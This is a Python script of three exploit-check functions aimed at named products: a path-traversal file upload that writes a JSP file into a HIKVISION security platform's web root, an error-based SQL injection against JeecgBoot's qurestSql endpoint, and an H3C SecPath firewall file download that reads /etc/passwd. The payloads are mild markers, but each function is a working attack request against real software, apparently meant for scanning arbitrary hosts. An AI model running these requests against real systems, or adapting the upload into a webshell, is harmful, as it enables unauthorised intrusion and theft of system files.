import requests


# HIKVISION 综合安防管理平台 report 任意文件上传漏洞
def hik_report(url):
    host = url
    url = "https://" + url + "/svm/api/external/report"

    headers = {
        "Host": host,
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"
    }

    data = '''------WebKitFormBoundary9PggsiM755PLa54a
    Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
    Content-Type: application/zip

    <%out.print("test");%>
    ------WebKitFormBoundary9PggsiM755PLa54a--'''

    try:
        response = requests.post(url, headers=headers, data=data)

        if "test" in response.text:
            result = True
        else:
            result = False

    except:
        result = False

    return result


# JeecgBoot 企业级低代码平台 qurestSql SQL注入漏洞
def jeecgboot(ip):
    try:
        url = "http://" + ip + "/jeecg-boot/jmreport/qurestSql"
        headers = {
            "Content-Type": "application/json"
        }

        data = {
            "apiSelectId": "1290104038414721025",
            "id": "1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"
        }

        response = requests.post(url, json=data, headers=headers)

        if "SQLException" in response.text:
            result = True
        else:
            result = False
    except:
        result = False

    return result


# H3C SecPath下一代防火墙 任意文件下载漏洞
def h3C_secpath_dl(ip):
    try:
        path = "/webui/?g=sys_dia_data_check&file_name=../../etc/passwd"
        url = "http://" + ip + path
        # print(url)
        response = requests.get(url)
        if "root" in response.text:
            result = True
        else:
            result = False
    except:
        result = False

    return result
